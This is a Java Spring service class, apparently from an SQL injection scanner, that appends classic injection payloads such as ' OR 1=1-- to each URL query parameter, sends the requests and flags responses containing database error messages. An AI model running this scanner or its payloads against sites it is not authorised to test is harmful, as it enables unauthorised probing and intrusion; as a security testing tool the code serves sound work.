package com.example.sqlscanner.service;

import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.*;
import java.util.*;

@Service
public class ScannerService {

    private static final String[] PAYLOADS = {
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR ''='",
            "\" OR \"\"=\"",
            "' OR 1=1#"
    };

    private static final String[] SQL_ERRORS = {
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "sqlite error",
            "pg_query",
            "mysql_fetch"
    };

    public List<Map<String, String>> scanUrl(String urlString) throws Exception {
        List<Map<String, String>> vulnerabilities = new ArrayList<>();

        URL url = new URL(urlString);
        String query = url.getQuery();
        if (query == null) throw new Exception("URL must contain parameters.");

        String baseUrl = urlString.split("\\?")[0];
        String[] params = query.split("&");

        for (String param : params) {
            String[] pair = param.split("=");
            if (pair.length != 2) continue;
            String key = pair[0];
            String originalValue = pair[1];

            for (String payload : PAYLOADS) {
                String injected = URLEncoder.encode(originalValue + payload, "UTF-8");

                StringBuilder modifiedQuery = new StringBuilder();
                for (String p : params) {
                    String[] parts = p.split("=");
                    if (parts[0].equals(key)) {
                        modifiedQuery.append(key).append("=").append(injected).append("&");
                    } else {
                        modifiedQuery.append(p).append("&");
                    }
                }

                modifiedQuery.setLength(modifiedQuery.length() - 1);
                String finalUrl = baseUrl + "?" + modifiedQuery;

                String response = sendRequest(finalUrl);

                for (String error : SQL_ERRORS) {
                    if (response.toLowerCase().contains(error.toLowerCase())) {
                        Map<String, String> finding = new HashMap<>();
                        finding.put("parameter", key);
                        finding.put("payload", payload);
                        finding.put("url", finalUrl);
                        vulnerabilities.add(finding);
                        break;
                    }
                }
            }
        }

        return vulnerabilities;
    }

    private String sendRequest(String urlStr) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setRequestMethod("GET");

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder builder = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            builder.append(line);
        }
        reader.close();
        return builder.toString();
    }
}
